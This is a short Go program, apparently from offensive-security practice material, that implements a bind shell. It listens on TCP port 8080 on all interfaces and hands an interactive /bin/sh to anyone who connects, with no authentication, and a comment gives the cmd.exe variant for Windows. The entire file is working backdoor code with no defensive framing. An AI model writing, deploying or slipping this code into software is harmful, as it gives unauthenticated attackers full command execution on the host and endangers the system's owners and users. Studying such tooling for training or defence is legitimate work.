package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

func handle(conn net.Conn) {

	//For Windows use exec.Command("cmd.exe")

	//cmd := exec.Command("cmd.exe")
	cmd := exec.Command("/bin/sh", "-i")
	rp, wp := io.Pipe()

	// Set stdin to our connection
	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}

func main() {
	listener, err := net.Listen("tcp", ":8080")
	if err != nil {
		log.Fatalln("Unable to bind to port")
		log.Fatalln(err)
	}

	log.Println("Listening on 0.0.0.0:8080")

	for {
		//Wait for connection. Create net.Conn on connection established.
		conn, err := listener.Accept()
		log.Println("Recieved connection")
		if err != nil {
			log.Fatalln("Unable to accept connection")
			log.Fatalln(err)
		}

		//handle the connection. Using goroutine for concurrency.
		go handle(conn)
	}
}
